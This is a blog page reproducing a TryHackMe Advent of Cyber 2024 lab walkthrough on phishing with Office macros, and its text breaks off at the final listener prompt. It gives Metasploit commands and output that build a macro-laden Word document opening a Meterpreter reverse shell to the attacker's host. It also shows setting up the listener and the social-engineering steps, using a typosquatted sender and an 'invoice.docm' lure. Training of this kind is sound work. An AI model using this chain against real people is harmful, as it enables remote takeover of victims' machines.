<!doctype html>
<html>
  <head>
  <title>
    
      TryHackMe Advent of Cyber - Day 10 | THM Advent of Cyber 2024
    
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8">
  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="stylesheet" href="/assets/css/syntax.css">
  <!-- Use Atom -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="THM Advent of Cyber 2024" />
  <!-- RSS-v2.0
  <link href="/rss-feed.xml" type="application/rss+xml" rel="alternate" title="THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication"/>
  //-->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto|Source+Code+Pro">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
  </script>
  <!-- Google Analytics -->
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-MSZW3HWGH8', 'auto');
  ga('send', 'pageview');
</script>

  <!-- Use Jekyll SEO plugin -->
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>TryHackMe Advent of Cyber - Day 10 | THM Advent of Cyber 2024</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="TryHackMe Advent of Cyber - Day 10" />
<meta name="author" content="Michael" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="The Story" />
<meta property="og:description" content="The Story" />
<link rel="canonical" href="http://localhost:4000/Day10" />
<meta property="og:url" content="http://localhost:4000/Day10" />
<meta property="og:site_name" content="THM Advent of Cyber 2024" />
<meta property="og:image" content="http://localhost:4000/Day10-logo.svg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-10T00:00:00-05:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/Day10-logo.svg" />
<meta property="twitter:title" content="TryHackMe Advent of Cyber - Day 10" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Michael"},"dateModified":"2024-12-10T00:00:00-05:00","datePublished":"2024-12-10T00:00:00-05:00","description":"The Story","headline":"TryHackMe Advent of Cyber - Day 10","image":"http://localhost:4000/Day10-logo.svg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Day10"},"url":"http://localhost:4000/Day10"}</script>
<!-- End Jekyll SEO tag -->

</head>

  <body>
    <div class="container">
      <header class="site-header">
  <h3 class="site-title">
    <a href="/">THM Advent of Cyber 2024</a>
  </h3>
  <nav class="menu-list">
    
      <a href="/about" class="menu-link">About</a>
    
      <a href="/contact" class="menu-link">Contact</a>
    
    
      <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
    
      <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
    
  </nav>
  <div class="dropdown">
    <button class="dropbtn"><i class="fa fa-bars" aria-hidden="true"></i></button>
    <div class="dropdown-content">
      
        <a href="/about" class="menu-link">About</a>
      
        <a href="/contact" class="menu-link">Contact</a>
      
      
        <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
      
        <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
      
    </div>
  </div>
</header>

      <div class="content-wrapper">
        <div class="post-content">
  <h1>
    TryHackMe Advent of Cyber - Day 10
  </h1>
  
    <span class="post-date">
  Written on
  
  December
  10th,
  2024
  by
  
    Michael
  
</span>

  
  
    <div class="featured-image">
      <img src="/assets/img/Day10-logo.svg">
    </div>
  
  <article>
    <p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376026704.svg" alt="Task banner for day DAY 10" /></p>

<p>Click here to watch the walkthrough video!</p>

<p><em>Mayor Malware had one, just one SOC-mas wish:</em></p>

<p><em>The SOC organiser would fall for his phish!</em></p>

<p><em>Well on top of this, he wanted as well,</em></p>

<p><em>Once the email opened, to gain a rev shell.</em></p>

<p>\n</p>

<p>Mayor Malware attempts to phish one of the SOC-mas organizers by sending a document embedded with a malicious macro. Once opened, the macro will execute, giving the Mayor remote access to the organizer’s system.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376786068.svg" alt="Mayor Malware attempts to phish one of the SOC-mas organizers." /> \n</p>

<p>Marta May Ware is surprised that her system was compromised even after following tight security, but McSkidy thinks she traced the attacker, and he got in. It’s none other than Mayor Malware who got into the system. This time, the Mayor used phishing to get his victim. McSkidy’s quick incident response prevented significant damage.</p>

<p>In this task, you will run a security assessment against Marta May Ware. The purpose would be to improve her security and raise her cyber security awareness against future attacks.</p>

<p>Glitch is still concerned about any future attack on Marta May Ware and advises McSkidy to run a phishing exercise on her to verify whether she is vigilant about these attacks.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Understand how phishing attacks work</li>
  <li>Discover how macros in documents can be used and abused</li>
  <li>Learn how to carry out a phishing attack with a macro</li>
</ul>

<h2 id="phishingattacks">Phishing Attacks</h2>

<p>Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.</p>

<p>Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.</p>

<p>One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.</p>

<h2 id="macros">Macros</h2>

<p>The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.</p>

<p>In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.</p>

<p>To add a macro to an MS Word document for instance, we click on the <strong>View</strong> menu and then select <strong>Macros</strong> as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the <strong>Create</strong> button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859866900.png" alt="Adding a macro to an MS Word document" /> \n</p>

<p>Let’s explore one way the attacker could have created an MS Word document with an embedded macro to gain access to Marta’s system.</p>

<h2 id="attack-plan">Attack Plan</h2>

<p>In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:</p>

<ol>
  <li>Create a document with a malicious macro</li>
  <li>Start listening for incoming connections on the attacker’s system</li>
  <li>Email the document and wait for the target user to open it</li>
  <li>The target user opens the document and connects to the attacker’s system</li>
  <li>Control the target user’s system</li>
</ol>

<p>You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.</p>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below: \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376755339.png" alt="We need to start the AttackBox and the attached VM" /> \n</p>

<p>Press the <strong>Start Machine</strong> button below to prepare the mail server.</p>

<p>Start Machine</p>

<p>Click on the <strong>Start AttackBox</strong> button at the top of the page to follow along with creating this document. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>

<h2 id="attackers-system">Attacker’s System</h2>

<p>On the AttackBox, you need to carry out two steps:</p>

<ul>
  <li>Create a document with an embedded malicious macro</li>
  <li>Listen for incoming connections</li>
</ul>

<h2 id="creating-the-malicious-document">Creating the Malicious Document</h2>

<p>The first step would be to embed a malicious macro within the document. Alternatively, you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.</p>

<p>You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:</p>

<ul>
  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell \n</li>
  <li><code class="language-plaintext highlighter-rouge">use exploit/multi/fileformat/office_word_macro</code> specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro</li>
  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system, <code class="language-plaintext highlighter-rouge">CONNECTION_IP</code> in this case is the IP of the AttackBox</li>
  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on for incoming connections on the AttackBox</li>
  <li><code class="language-plaintext highlighter-rouge">show options</code> shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example</li>
  <li><code class="language-plaintext highlighter-rouge">exploit</code> generates a macro and embeds it in a document</li>
  <li><code class="language-plaintext highlighter-rouge">exit</code> to quit and return to the terminal</li>
</ul>

<p>In the terminal below, you can see the execution of the above steps.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="p">[...]</span>
<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>

<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">):</span>

   <span class="nx">Name</span>            <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>            <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">CUSTOMTEMPLATE</span>                   <span class="nx">no</span>        <span class="nx">A</span> <span class="nx">docx</span> <span class="nx">file</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">as</span> <span class="nx">a</span> <span class="nx">template</span> <span class="nx">to</span> <span class="nx">build</span> <span class="nx">the</span> <span class="nx">exploit</span>
   <span class="nx">FILENAME</span>        <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>         <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">Office</span> <span class="nb">document</span> <span class="nx">macro</span> <span class="nf">file </span><span class="p">(</span><span class="nx">docm</span><span class="p">)</span>


<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">thread</span>           <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>

   <span class="o">**</span><span class="nx">DisablePayloadHandler</span><span class="p">:</span> <span class="nc">True   </span><span class="p">(</span><span class="nx">no</span> <span class="nx">handler</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">created</span><span class="o">!</span><span class="p">)</span><span class="o">**</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Microsoft</span> <span class="nx">Office</span> <span class="nx">Word</span> <span class="nx">on</span> <span class="nx">Windows</span>


<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>

<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">template</span><span class="p">:</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">embedded</span><span class="o">/</span><span class="nx">framework</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">exploits</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="o">/</span><span class="nx">template</span><span class="p">.</span><span class="nx">docx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">payload</span> <span class="k">in</span> <span class="nb">document</span> <span class="nx">comments</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">macro</span> <span class="nx">and</span> <span class="nx">other</span> <span class="nx">required</span> <span class="nx">files</span> <span class="k">in</span> <span class="nb">document</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Finalizing</span> <span class="nx">docm</span><span class="p">:</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span> <span class="nx">stored</span> <span class="nx">at</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="p">.</span><span class="nx">msf4</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exit</span>
</code></pre></div></div>

<p>As you can see, the Word document with the embedded macro was created and stored in <code class="language-plaintext highlighter-rouge">/root/.msf4/local/msf.docm</code>.</p>

<h2 id="the-created-macro-enabled-document">The Created Macro-Enabled Document</h2>

<p>We mentioned earlier how to create a macro within an MS Word document. You might be interested to see the content of the file created by <code class="language-plaintext highlighter-rouge">msfconsole</code>. In the screenshot below, we can see the different procedures and functions that make up this macro. <strong>Note:</strong>The AttackBox doesn’t have MS Office installed, so for this section you only have to read along. \n</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">AutoOpen()</code> triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using <code class="language-plaintext highlighter-rouge">base64</code> encoding in the Comments field is actually the payload.</li>
  <li><code class="language-plaintext highlighter-rouge">Base64Decode()</code> converts the payload to its original form. In this case, it is an executable MS Windows file.</li>
  <li><code class="language-plaintext highlighter-rouge">ExecuteForWindows()</code> executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.</li>
</ol>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859885481.png" alt="Example macro code with functions and subroutines" /> \n</p>

<p>The <strong>Comments</strong> field is shown in the screenshot below. It is close to 100,000 characters in our case.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859926077.png" alt="The Comments field in an MS Office document" /> \n</p>

<p>If you copy it and save it to a text file, you can convert it to its original executable format using <code class="language-plaintext highlighter-rouge">base64</code> as shown below. You can notice the size of the files.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span> <span class="o">&gt;</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">lh</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">97</span><span class="nx">K</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">73</span><span class="nx">K</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
</code></pre></div></div>

<p>You already expect this file to connect to the specified IP address and port. If you would like to check its behaviour in a sandbox, you can check the <a href="https://www.virustotal.com/gui/file/ab3f9303460c590c452f0c259a35d50a7a2e7c52a81d4e5a42bb98b365d8ab9b/behavior">VirusTotal report</a> for a file that we created and uploaded. In this case, it attempts to connect to <code class="language-plaintext highlighter-rouge">10.9.18.120</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859908974.png" alt="VirusTotal summary of the payload behaviour" /> \n</p>

<h2 id="listening-for-incoming-connections">Listening for Incoming Connections</h2>

<p>We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:</p>

<ul>
  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
  <li><code class="language-plaintext highlighter-rouge">use multi/handler</code> to handle incoming connections</li>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>to ensure that our payload works with the payload used when creating the malicious macro \n</li>
  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system and should be the same as the one used when creating the document</li>
  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on and should be the same as the one used when creating the document</li>
  <li><code class="language-plaintext highlighter-rouge">show options</code> to confirm the values of your options</li>
  <li><code class="language-plaintext highlighter-rouge">exploit</code> starts listening for incoming connections to establish a reverse shell</li>
</ul>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="p">[...]</span>
<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>

<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">generic</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">):</span>

   <span class="nx">Name</span>  <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>  <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>


<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">process</span>          <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Wildcard</span> <span class="nx">Target</span>



<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>

<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
</code></pre></div></div>

<p>\n</p>

<h2 id="email-the-malicious-document">Email the Malicious Document</h2>

<p>The malicious document has been created. All you need to do is to send it to the target user. It is time to send an email to the target user, <code class="language-plaintext highlighter-rouge">marta@socmas.thm</code>. Mayor Malware has prepared the following credentials:</p>

<ul>
  <li>Email: <code class="language-plaintext highlighter-rouge">info@socnas.thm</code></li>
  <li>Password: <code class="language-plaintext highlighter-rouge">MerryPhishMas!</code></li>
</ul>

<p>Notice how Mayor Malware uses a domain name that looks similar to the target user’s. This technique is known as “typosquatting,” where attackers create domain names that are nearly identical to legitimate ones in order to trick victims. On the AttackBox, start the Firefox web browser and head to http://MACHINE_IP. Use the above credentials to log in.</p>

<p>Once logged in, compose an email to the target user, and don’t forget to attach the document you created. Changing the name to something more convincing, such as <code class="language-plaintext highlighter-rouge">invoice.docm</code> or <code class="language-plaintext highlighter-rouge">receipt.docm</code> might be a good idea. Also, write a couple of sentences explaining what you are attaching to convince Marta May Ware to open the document. <strong>Note:</strong> You can use CTRL+H on the file upload pop-up to be able to see the <code class="language-plaintext highlighter-rouge">.msf4</code> directory where our email attachment is located.</p>

<h2 id="exploitation">Exploitation</h2>

<p>If everything works out, you will get a reverse shell after about 2 minutes. You can access the files and folders on the target system via the command line. You can use <code class="language-plaintext highlighter-rouge">cat</code> to display any text file.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

